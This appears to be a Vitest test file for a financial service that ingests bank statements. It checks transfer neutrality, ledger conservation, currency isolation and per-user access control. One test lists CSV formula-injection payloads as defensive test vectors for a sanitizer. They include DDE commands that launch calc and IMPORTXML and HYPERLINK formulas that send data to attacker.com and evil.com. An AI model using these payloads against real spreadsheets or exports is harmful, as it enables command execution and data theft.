import { describe, expect, it } from "vitest";
import {
  assertSameCurrency,
  CurrencyMismatchError,
} from "../../src/lib/financial-intelligence/types";
import { sanitizeCsvField } from "../../src/lib/financial-intelligence/ingestion/csv-parser";
import { MultiAccountFinancialIntelligenceService } from "../../src/lib/financial-intelligence/service";

describe("Financial Intelligence - Property Invariants & Security Boundaries", () => {
  describe("Invariant 1: Internal Transfer Neutrality on Net Worth", () => {
    it("preserves total currency balance and external cash flow regardless of transfer volume", async () => {
      const service = new MultiAccountFinancialIntelligenceService();

      const accA = await service.registerAccount({
        ownerId: "user_invariants",
        institution: { code: "058", name: "GTBank", type: "commercial_bank" },
        accountNumberMasked: "******1001",
        accountName: "Account A",
        currency: "NGN",
        accountType: "checking",
      });

      const accB = await service.registerAccount({
        ownerId: "user_invariants",
        institution: { code: "044", name: "Access Bank", type: "commercial_bank" },
        accountNumberMasked: "******1002",
        accountName: "Account B",
        currency: "NGN",
        accountType: "savings",
      });

      // External funding into A: ₦1,000,000
      // 10 internal transfers of varying amounts from A to B: ₦50,000, ₦12,000, ₦85,000, etc.
      // External grocery spend from B: ₦40,000
      const transfers = [
        5000000n, // ₦50,000
        1200000n, // ₦12,000
        8500000n, // ₦85,000
        2500000n, // ₦25,000
        10000000n, // ₦100,000
      ];

      let aCsv = `Trans Date,Description,Amount,Type,Reference\n2026-11-01,External Salary Deposit,1000000.00,Credit,EXT_01\n`;
      let bCsv = `Trans Date,Description,Amount,Type,Reference\n2026-11-10,Grocery Spending,40000.00,Debit,EXT_02\n`;

      transfers.forEach((atoms, idx) => {
        const naira = Number(atoms) / 100;
        const ref = `INT_TRF_${idx}`;
        aCsv += `2026-11-0${idx + 2},Transfer to Account B,${naira}.00,Debit,${ref}\n`;
        bCsv += `2026-11-0${idx + 2},Transfer from Account A,${naira}.00,Credit,${ref}\n`;
      });

      await service.ingestStatement("user_invariants", accA.id, aCsv, "a.csv");
      await service.ingestStatement("user_invariants", accB.id, bCsv, "b.csv");

      const overview = await service.getFinancialOverview("user_invariants", "NGN");

      // Net worth check:
      // Starting external: ₦1,000,000
      // External spend: ₦40,000
      // Expected total net balance = ₦960,000.00
      const totalBalance = overview.balances.currencySummaries.NGN.totalAtoms;
      expect(totalBalance).toBe(96000000n);
      expect(overview.balances.currencySummaries.NGN.formatted).toBe("₦960,000.00");

      // External cash flow check:
      // True Income = ₦1,000,000.00
      // True Spending = ₦40,000.00
      // Net Cash Flow = ₦960,000.00
      expect(overview.cashFlow.overall.grossIncomeAtoms).toBe(100000000n);
      expect(overview.cashFlow.overall.grossSpendingAtoms).toBe(4000000n);
      expect(overview.cashFlow.overall.netCashFlowAtoms).toBe(96000000n);

      // Verify that all 5 transfer pairs (10 transactions) were excluded from spending and income
      expect(overview.cashFlow.excludedInternalTransfersCount).toBe(10);
    });
  });

  describe("Invariant 2: Conservation of Monetary Ledger", () => {
    it("guarantees ending balance equals starting balance plus external changes", async () => {
      const service = new MultiAccountFinancialIntelligenceService();

      const acc = await service.registerAccount({
        ownerId: "user_conserve",
        institution: { code: "058", name: "GTBank", type: "commercial_bank" },
        accountNumberMasked: "******9999",
        accountName: "Vault",
        currency: "NGN",
        accountType: "checking",
      });

      const statement = `
Date,Description,Amount,Type
2026-11-01,Credit 1,150.25,Credit
2026-11-02,Debit 1,40.10,Debit
2026-11-03,Credit 2,89.85,Credit
2026-11-04,Debit 2,100.00,Debit
`.trim();

      await service.ingestStatement("user_conserve", acc.id, statement, "stmt.csv");
      const overview = await service.getFinancialOverview("user_conserve", "NGN");

      // Inflows: 150.25 + 89.85 = 240.10 -> 24010 atoms
      // Outflows: 40.10 + 100.00 = 140.10 -> 14010 atoms
      // Net balance: 100.00 -> 10000 atoms
      const net = overview.balances.currencySummaries.NGN.totalAtoms;
      expect(net).toBe(10000n);
      expect(overview.balances.currencySummaries.NGN.formatted).toBe("₦100.00");
    });
  });

  describe("Invariant 3: Strict Currency Isolation", () => {
    it("throws CurrencyMismatchError when comparing or combining different currencies without rate", () => {
      expect(() => assertSameCurrency("NGN", "USD")).toThrow(CurrencyMismatchError);
      expect(() => assertSameCurrency("USD", "USDC")).toThrow(CurrencyMismatchError);
      expect(() => assertSameCurrency("EUR", "GBP")).toThrow(CurrencyMismatchError);

      // Same currency passes without error
      expect(() => assertSameCurrency("NGN", "NGN")).not.toThrow();
      expect(() => assertSameCurrency("USDC", "USDC")).not.toThrow();
    });
  });

  describe("Invariant 4: CSV Formula Injection Immunity", () => {
    it("disarms arbitrary formula prefixes across randomized test vectors", () => {
      const maliciousPayloads = [
        "=1+1",
        "=SUM(A1:A10)",
        "=cmd|'/C calc'!A0",
        "=DDE('cmd';'/C calc';'__DdeLink__')",
        "=IMPORTXML('https://attacker.com/leak?data=', '//tr')",
        "@SUM(1,2)",
        "+1+1",
        "-2+3*cmd|' /C calc'!A0",
        "\t=2+5",
        "\r\n=1+1",
        "=HYPERLINK('http://evil.com?leak='&A1, 'Click here')",
      ];

      for (const payload of maliciousPayloads) {
        const sanitized = sanitizeCsvField(payload);
        // The first character must NEVER be an active spreadsheet formula trigger
        const firstChar = sanitized.charAt(0);
        expect(firstChar).toBe("'");
        expect(sanitized.includes("\t")).toBe(false);
        expect(sanitized.includes("\r")).toBe(false);
      }
    });
  });

  describe("Invariant 5: Multi-User Isolation Boundary", () => {
    it("completely isolates accounts, transactions, and overview between different users", async () => {
      const service = new MultiAccountFinancialIntelligenceService();

      const userA_Acc = await service.registerAccount({
        ownerId: "user_alice",
        institution: { code: "058", name: "GTBank", type: "commercial_bank" },
        accountNumberMasked: "******1111",
        accountName: "Alice Account",
        currency: "NGN",
        accountType: "checking",
      });

      const userB_Acc = await service.registerAccount({
        ownerId: "user_bob",
        institution: { code: "044", name: "Access Bank", type: "commercial_bank" },
        accountNumberMasked: "******2222",
        accountName: "Bob Account",
        currency: "NGN",
        accountType: "checking",
      });

      await service.ingestStatement(
        "user_alice",
        userA_Acc.id,
        `Date,Description,Amount,Type\n2026-11-01,Alice Salary,500000.00,Credit\n`,
        "alice.csv",
      );

      await service.ingestStatement(
        "user_bob",
        userB_Acc.id,
        `Date,Description,Amount,Type\n2026-11-01,Bob Salary,300000.00,Credit\n`,
        "bob.csv",
      );

      const aliceOverview = await service.getFinancialOverview("user_alice");
      const bobOverview = await service.getFinancialOverview("user_bob");

      expect(aliceOverview.balances.currencySummaries.NGN.totalAtoms).toBe(50000000n);
      expect(bobOverview.balances.currencySummaries.NGN.totalAtoms).toBe(30000000n);

      const aliceTxs = await service.queryTransactions("user_alice");
      const bobTxs = await service.queryTransactions("user_bob");

      expect(aliceTxs.totalCount).toBe(1);
      expect(bobTxs.totalCount).toBe(1);
      expect(aliceTxs.items[0].ownerId).toBe("user_alice");
      expect(bobTxs.items[0].ownerId).toBe("user_bob");

      // User A cannot ingest statement or access account of User B
      await expect(async () => {
        await service.ingestStatement("user_alice", userB_Acc.id, "Date,Description,Amount\n", "attack.csv");
      }).rejects.toThrow(/Account not found or access denied/);
    });
  });
});
